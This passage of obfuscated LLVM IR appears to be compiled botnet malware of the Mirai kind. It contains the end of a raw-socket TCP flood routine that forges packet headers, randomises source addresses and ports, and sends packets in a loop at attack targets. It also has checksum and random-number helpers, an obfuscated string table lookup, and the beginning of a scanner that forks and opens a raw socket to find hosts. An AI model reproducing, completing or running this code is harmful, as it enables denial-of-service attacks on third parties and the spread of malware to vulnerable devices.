  %465 = load i8*, i8** %30, align 8
  %466 = bitcast i8* %465 to %struct.iphdr*
  store %struct.iphdr* %466, %struct.iphdr** %31, align 8
  %467 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i64 1
  %469 = bitcast %struct.iphdr* %468 to %struct.tcphdr*
  store %struct.tcphdr* %469, %struct.tcphdr** %32, align 8
  %470 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %471 = load i32, i32* %9, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %470, i64 %472
  %474 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i32 0, i32 2
  %475 = load i8, i8* %474, align 4
  %476 = zext i8 %475 to i32
  %477 = icmp slt i32 %476, 32
  br i1 %477, label %478, label %502

; <label>:478:                                    ; preds = %459
  %479 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %480 = load i32, i32* %9, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %479, i64 %481
  %483 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %482, i32 0, i32 1
  %484 = load i32, i32* %483, align 4
  %485 = call i32 @ntohl(i32 %484) #7
  %486 = call i32 @rand_next()
  %487 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %488 = load i32, i32* %9, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i64 %489
  %491 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i32 0, i32 2
  %492 = load i8, i8* %491, align 4
  %493 = zext i8 %492 to i32
  %494 = lshr i32 %486, %493
  %495 = add i32 %485, 1547707514
  %496 = add i32 %495, %494
  %497 = sub i32 %496, 1547707514
  %498 = add i32 %485, %494
  %499 = call i32 @htonl(i32 %497) #7
  %500 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i32 0, i32 9
  store i32 %499, i32* %501, align 4
  br label %502

; <label>:502:                                    ; preds = %478, %459
  %503 = load i32, i32* %26, align 4
  %504 = icmp eq i32 %503, -1
  br i1 %504, label %505, label %509

; <label>:505:                                    ; preds = %502
  %506 = call i32 @rand_next()
  %507 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %508 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %507, i32 0, i32 8
  store i32 %506, i32* %508, align 4
  br label %509

; <label>:509:                                    ; preds = %505, %502
  %510 = load i16, i16* %13, align 2
  %511 = zext i16 %510 to i32
  %512 = icmp eq i32 %511, 65535
  br i1 %512, label %513, label %526

; <label>:513:                                    ; preds = %509
  %514 = call i32 @rand_next()
  %515 = xor i32 %514, -1
  %516 = xor i32 65535, -1
  %517 = xor i32 -303394799, -1
  %518 = or i32 %515, %516
  %519 = or i32 -303394799, %517
  %520 = xor i32 %518, -1
  %521 = and i32 %520, %519
  %522 = and i32 %514, 65535
  %523 = trunc i32 %521 to i16
  %524 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 3
  store i16 %523, i16* %525, align 4
  br label %526

; <label>:526:                                    ; preds = %513, %509
  %527 = load i16, i16* %16, align 2
  %528 = zext i16 %527 to i32
  %529 = icmp eq i32 %528, 65535
  br i1 %529, label %530, label %539

; <label>:530:                                    ; preds = %526
  %531 = call i32 @rand_next()
  %532 = xor i32 65535, -1
  %533 = xor i32 %531, %532
  %534 = and i32 %533, %531
  %535 = and i32 %531, 65535
  %536 = trunc i32 %534 to i16
  %537 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %538 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %537, i32 0, i32 0
  store i16 %536, i16* %538, align 4
  br label %539

; <label>:539:                                    ; preds = %530, %526
  %540 = load i16, i16* %17, align 2
  %541 = zext i16 %540 to i32
  %542 = icmp eq i32 %541, 65535
  br i1 %542, label %543, label %552

; <label>:543:                                    ; preds = %539
  %544 = call i32 @rand_next()
  %545 = xor i32 65535, -1
  %546 = xor i32 %544, %545
  %547 = and i32 %546, %544
  %548 = and i32 %544, 65535
  %549 = trunc i32 %547 to i16
  %550 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %551 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %550, i32 0, i32 1
  store i16 %549, i16* %551, align 2
  br label %552

; <label>:552:                                    ; preds = %543, %539
  %553 = load i32, i32* %18, align 4
  %554 = icmp eq i32 %553, 65535
  br i1 %554, label %555, label %559

; <label>:555:                                    ; preds = %552
  %556 = call i32 @rand_next()
  %557 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %558 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %557, i32 0, i32 2
  store i32 %556, i32* %558, align 4
  br label %559

; <label>:559:                                    ; preds = %555, %552
  %560 = load i32, i32* %19, align 4
  %561 = icmp eq i32 %560, 65535
  br i1 %561, label %562, label %566

; <label>:562:                                    ; preds = %559
  %563 = call i32 @rand_next()
  %564 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 3
  store i32 %563, i32* %565, align 4
  br label %566

; <label>:566:                                    ; preds = %562, %559
  %567 = load i8, i8* %20, align 1
  %568 = icmp ne i8 %567, 0
  br i1 %568, label %569, label %578

; <label>:569:                                    ; preds = %566
  %570 = call i32 @rand_next()
  %571 = xor i32 65535, -1
  %572 = xor i32 %570, %571
  %573 = and i32 %572, %570
  %574 = and i32 %570, 65535
  %575 = trunc i32 %573 to i16
  %576 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 7
  store i16 %575, i16* %577, align 2
  br label %578

; <label>:578:                                    ; preds = %569, %566
  %579 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %580 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %579, i32 0, i32 7
  store i16 0, i16* %580, align 2
  %581 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %582 = bitcast %struct.iphdr* %581 to i16*
  %583 = call zeroext i16 @checksum_generic(i16* %582, i32 20)
  %584 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %585 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %584, i32 0, i32 7
  store i16 %583, i16* %585, align 2
  %586 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 6
  store i16 0, i16* %587, align 4
  %588 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %589 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %590 = bitcast %struct.tcphdr* %589 to i8*
  %591 = call zeroext i16 @htons(i16 zeroext 40) #7
  %592 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %588, i8* %590, i16 zeroext %591, i32 40)
  %593 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %594 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %593, i32 0, i32 6
  store i16 %592, i16* %594, align 4
  %595 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 1
  %597 = load i16, i16* %596, align 2
  %598 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %599 = load i32, i32* %9, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %598, i64 %600
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i32 0, i32 0
  %603 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %602, i32 0, i32 1
  store i16 %597, i16* %603, align 2
  %604 = load i32, i32* %10, align 4
  %605 = load i8*, i8** %30, align 8
  %606 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %607 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %608 = load i32, i32* %9, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %607, i64 %609
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i32 0, i32 0
  %612 = bitcast %struct.sockaddr_in* %611 to %struct.sockaddr*
  store %struct.sockaddr* %612, %struct.sockaddr** %606, align 8
  %613 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %614 = load %struct.sockaddr*, %struct.sockaddr** %613, align 8
  %615 = call i64 @sendto(i32 %604, i8* %605, i64 60, i32 16384, %struct.sockaddr* %614, i32 16)
  br label %616

; <label>:616:                                    ; preds = %578
  %617 = load i32, i32* %9, align 4
  %618 = add i32 %617, 226868543
  %619 = add i32 %618, 1
  %620 = sub i32 %619, 226868543
  %621 = add nsw i32 %617, 1
  store i32 %620, i32* %9, align 4
  br label %454

; <label>:622:                                    ; preds = %454
  br label %453

; <label>:623:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, 6007884232096239449
  %16 = add i64 %15, %13
  %17 = add i64 %16, 6007884232096239449
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  br label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* %4, align 4
  %21 = sub i32 0, 2
  %22 = add i32 %20, %21
  %23 = sub i32 %20, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp eq i32 %25, 1
  br i1 %26, label %27, label %38

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = load i16, i16* %28, align 2
  %30 = trunc i16 %29 to i8
  %31 = sext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %32
  %34 = sub i64 0, %31
  %35 = add i64 %33, %34
  %36 = sub i64 0, %35
  %37 = add i64 %32, %31
  store i64 %36, i64* %5, align 8
  br label %38

; <label>:38:                                     ; preds = %27, %24
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 65535, -1
  %43 = xor i64 %41, %42
  %44 = and i64 %43, %41
  %45 = and i64 %41, 65535
  %46 = sub i64 0, %44
  %47 = sub i64 %40, %46
  %48 = add i64 %40, %44
  store i64 %47, i64* %5, align 8
  %49 = load i64, i64* %5, align 8
  %50 = lshr i64 %49, 16
  %51 = load i64, i64* %5, align 8
  %52 = sub i64 0, %51
  %53 = sub i64 0, %50
  %54 = add i64 %52, %53
  %55 = sub i64 0, %54
  %56 = add i64 %51, %50
  store i64 %55, i64* %5, align 8
  %57 = load i64, i64* %5, align 8
  %58 = xor i64 %57, -1
  %59 = and i64 -8153893424540905399, %58
  %60 = xor i64 -8153893424540905399, -1
  %61 = and i64 %57, %60
  %62 = xor i64 -1, -1
  %63 = and i64 %62, -8153893424540905399
  %64 = and i64 -1, %60
  %65 = or i64 %59, %61
  %66 = or i64 %63, %64
  %67 = xor i64 %65, %66
  %68 = xor i64 %57, -1
  %69 = trunc i64 %67 to i16
  ret i16 %69
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %43

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 0, %30
  %32 = sub i32 0, %29
  %33 = add i32 %31, %32
  %34 = sub i32 0, %33
  %35 = add i32 %30, %29
  store i32 %34, i32* %12, align 4
  %36 = load i16*, i16** %9, align 8
  %37 = getelementptr inbounds i16, i16* %36, i32 1
  store i16* %37, i16** %9, align 8
  %38 = load i32, i32* %8, align 4
  %39 = add i32 %38, 1088339788
  %40 = sub i32 %39, 2
  %41 = sub i32 %40, 1088339788
  %42 = sub nsw i32 %38, 2
  store i32 %41, i32* %8, align 4
  br label %23

; <label>:43:                                     ; preds = %23
  %44 = load i32, i32* %8, align 4
  %45 = icmp eq i32 %44, 1
  br i1 %45, label %46, label %55

; <label>:46:                                     ; preds = %43
  %47 = load i16*, i16** %9, align 8
  %48 = bitcast i16* %47 to i8*
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = load i32, i32* %12, align 4
  %52 = sub i32 0, %50
  %53 = sub i32 %51, %52
  %54 = add i32 %51, %50
  store i32 %53, i32* %12, align 4
  br label %55

; <label>:55:                                     ; preds = %46, %43
  %56 = load i32, i32* %10, align 4
  %57 = lshr i32 %56, 16
  %58 = xor i32 65535, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65535
  %62 = load i32, i32* %12, align 4
  %63 = sub i32 0, %60
  %64 = sub i32 %62, %63
  %65 = add i32 %62, %60
  store i32 %64, i32* %12, align 4
  %66 = load i32, i32* %10, align 4
  %67 = xor i32 %66, -1
  %68 = xor i32 65535, -1
  %69 = xor i32 2060246150, -1
  %70 = or i32 %67, %68
  %71 = or i32 2060246150, %69
  %72 = xor i32 %70, -1
  %73 = and i32 %72, %71
  %74 = and i32 %66, 65535
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, -2020052874
  %77 = add i32 %76, %73
  %78 = sub i32 %77, -2020052874
  %79 = add i32 %75, %73
  store i32 %78, i32* %12, align 4
  %80 = load i32, i32* %11, align 4
  %81 = lshr i32 %80, 16
  %82 = xor i32 %81, -1
  %83 = xor i32 65535, -1
  %84 = xor i32 686281042, -1
  %85 = or i32 %82, %83
  %86 = or i32 686281042, %84
  %87 = xor i32 %85, -1
  %88 = and i32 %87, %86
  %89 = and i32 %81, 65535
  %90 = load i32, i32* %12, align 4
  %91 = add i32 %90, -918308064
  %92 = add i32 %91, %88
  %93 = sub i32 %92, -918308064
  %94 = add i32 %90, %88
  store i32 %93, i32* %12, align 4
  %95 = load i32, i32* %11, align 4
  %96 = xor i32 65535, -1
  %97 = xor i32 %95, %96
  %98 = and i32 %97, %95
  %99 = and i32 %95, 65535
  %100 = load i32, i32* %12, align 4
  %101 = add i32 %100, -1630405085
  %102 = add i32 %101, %98
  %103 = sub i32 %102, -1630405085
  %104 = add i32 %100, %98
  store i32 %103, i32* %12, align 4
  %105 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 6
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i16
  %109 = call zeroext i16 @htons(i16 zeroext %108) #7
  %110 = zext i16 %109 to i32
  %111 = load i32, i32* %12, align 4
  %112 = sub i32 0, %111
  %113 = sub i32 0, %110
  %114 = add i32 %112, %113
  %115 = sub i32 0, %114
  %116 = add i32 %111, %110
  store i32 %115, i32* %12, align 4
  %117 = load i16, i16* %7, align 2
  %118 = zext i16 %117 to i32
  %119 = load i32, i32* %12, align 4
  %120 = sub i32 %119, -1681271301
  %121 = add i32 %120, %118
  %122 = add i32 %121, -1681271301
  %123 = add i32 %119, %118
  store i32 %122, i32* %12, align 4
  br label %124

; <label>:124:                                    ; preds = %128, %55
  %125 = load i32, i32* %12, align 4
  %126 = lshr i32 %125, 16
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %140

; <label>:128:                                    ; preds = %124
  %129 = load i32, i32* %12, align 4
  %130 = xor i32 65535, -1
  %131 = xor i32 %129, %130
  %132 = and i32 %131, %129
  %133 = and i32 %129, 65535
  %134 = load i32, i32* %12, align 4
  %135 = lshr i32 %134, 16
  %136 = sub i32 %132, 1023235554
  %137 = add i32 %136, %135
  %138 = add i32 %137, 1023235554
  %139 = add i32 %132, %135
  store i32 %138, i32* %12, align 4
  br label %124

; <label>:140:                                    ; preds = %124
  %141 = load i32, i32* %12, align 4
  %142 = xor i32 %141, -1
  %143 = and i32 -545969033, %142
  %144 = xor i32 -545969033, -1
  %145 = and i32 %141, %144
  %146 = xor i32 -1, -1
  %147 = and i32 %146, -545969033
  %148 = and i32 -1, %144
  %149 = or i32 %143, %145
  %150 = or i32 %147, %148
  %151 = xor i32 %149, %150
  %152 = xor i32 %141, -1
  %153 = trunc i32 %151 to i16
  ret i16 %153
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 %13, %15
  %17 = xor i32 %13, -1
  %18 = and i32 %14, %17
  %19 = or i32 %16, %18
  %20 = xor i32 %14, %13
  store i32 %19, i32* %1, align 4
  %21 = load i32, i32* @y, align 4
  store i32 %21, i32* @x, align 4
  %22 = load i32, i32* @z, align 4
  store i32 %22, i32* @y, align 4
  %23 = load i32, i32* @w, align 4
  store i32 %23, i32* @z, align 4
  %24 = load i32, i32* @w, align 4
  %25 = lshr i32 %24, 19
  %26 = load i32, i32* @w, align 4
  %27 = xor i32 %26, -1
  %28 = and i32 %25, %27
  %29 = xor i32 %25, -1
  %30 = and i32 %26, %29
  %31 = or i32 %28, %30
  %32 = xor i32 %26, %25
  store i32 %31, i32* @w, align 4
  %33 = load i32, i32* %1, align 4
  %34 = load i32, i32* @w, align 4
  %35 = xor i32 %34, -1
  %36 = and i32 1565002637, %35
  %37 = xor i32 1565002637, -1
  %38 = and i32 %34, %37
  %39 = xor i32 %33, -1
  %40 = and i32 %39, 1565002637
  %41 = and i32 %33, %37
  %42 = or i32 %36, %38
  %43 = or i32 %40, %41
  %44 = xor i32 %42, %43
  %45 = xor i32 %34, %33
  store i32 %44, i32* @w, align 4
  %46 = load i32, i32* @w, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %64, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %65

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %24

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = add i64 %18, 1560106535712072547
  %20 = sub i64 %19, 4
  %21 = sub i64 %20, 1560106535712072547
  %22 = sub i64 %18, 4
  %23 = trunc i64 %21 to i32
  store i32 %23, i32* %4, align 4
  br label %64

; <label>:24:                                     ; preds = %8
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %25, 2
  br i1 %26, label %27, label %45

; <label>:27:                                     ; preds = %24
  %28 = call i32 @rand_next()
  %29 = xor i32 65535, -1
  %30 = xor i32 %28, %29
  %31 = and i32 %30, %28
  %32 = and i32 %28, 65535
  %33 = trunc i32 %31 to i16
  %34 = load i8*, i8** %3, align 8
  %35 = bitcast i8* %34 to i16*
  store i16 %33, i16* %35, align 2
  %36 = load i8*, i8** %3, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 2
  store i8* %37, i8** %3, align 8
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = sub i64 %39, 268859568357015512
  %41 = sub i64 %40, 2
  %42 = add i64 %41, 268859568357015512
  %43 = sub i64 %39, 2
  %44 = trunc i64 %42 to i32
  store i32 %44, i32* %4, align 4
  br label %63

; <label>:45:                                     ; preds = %24
  %46 = call i32 @rand_next()
  %47 = xor i32 %46, -1
  %48 = xor i32 255, -1
  %49 = xor i32 -314484195, -1
  %50 = or i32 %47, %48
  %51 = or i32 -314484195, %49
  %52 = xor i32 %50, -1
  %53 = and i32 %52, %51
  %54 = and i32 %46, 255
  %55 = trunc i32 %53 to i8
  %56 = load i8*, i8** %3, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %3, align 8
  store i8 %55, i8* %56, align 1
  %58 = load i32, i32* %4, align 4
  %59 = sub i32 %58, -159296052
  %60 = add i32 %59, -1
  %61 = add i32 %60, -159296052
  %62 = add nsw i32 %58, -1
  store i32 %61, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %45, %27
  br label %64

; <label>:64:                                     ; preds = %63, %11
  br label %5

; <label>:65:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 28, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %16, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 %10, -525989210
  %12 = add i32 %11, -1
  %13 = add i32 %12, -525989210
  %14 = add nsw i32 %10, -1
  store i32 %13, i32* %4, align 4
  %15 = icmp ne i32 %10, 0
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %9
  %17 = call i32 @rand_next()
  %18 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %19 = call i32 @util_strlen(i8* %18)
  %20 = urem i32 %17, %19
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = load i8*, i8** %3, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %3, align 8
  store i8 %23, i8* %24, align 1
  br label %9

; <label>:26:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.28, align 8
  %6 = alloca %struct.fd_set.28, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.29, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49, %0
  ret void

; <label>:53:                                     ; preds = %49
  %54 = call i32 @util_local_addr()
  store i32 %54, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %55 = call i64 @time(i64* null) #6
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @fake_time, align 4
  %57 = call noalias i8* @calloc(i64 256, i64 296) #6
  %58 = bitcast i8* %57 to %struct.scanner_connection*
  store %struct.scanner_connection* %58, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %73, %53
  %60 = load i32, i32* %1, align 4
  %61 = icmp slt i32 %60, 256
  br i1 %61, label %62, label %79

; <label>:62:                                     ; preds = %59
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i64 %65
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 3
  store i32 0, i32* %67, align 8
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %69 = load i32, i32* %1, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i64 %70
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  store i32 -1, i32* %72, align 8
  br label %73

; <label>:73:                                     ; preds = %62
  %74 = load i32, i32* %1, align 4
  %75 = sub i32 %74, -1616242264
  %76 = add i32 %75, 1
  %77 = add i32 %76, -1616242264
  %78 = add nsw i32 %74, 1
  store i32 %77, i32* %1, align 4
  br label %59

; <label>:79:                                     ; preds = %59
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %80, i32* @rsck, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %79
  call void @exit(i32 0) #8
  unreachable

; <label>:83:                                     ; preds = %79
  %84 = load i32, i32* @rsck, align 4
  %85 = load i32, i32* @rsck, align 4
  %86 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 3, i32 0)
  %87 = and i32 2048, %86
  %88 = xor i32 2048, %86
  %89 = or i32 %87, %88
  %90 = or i32 2048, %86
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 4, i32 %89)
  store i32 1, i32* %1, align 4
  %92 = load i32, i32* @rsck, align 4
  %93 = bitcast i32* %1 to i8*
  %94 = call i32 @setsockopt(i32 %92, i32 0, i32 3, i8* %93, i32 4) #6
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %99

; <label>:96:                                     ; preds = %83
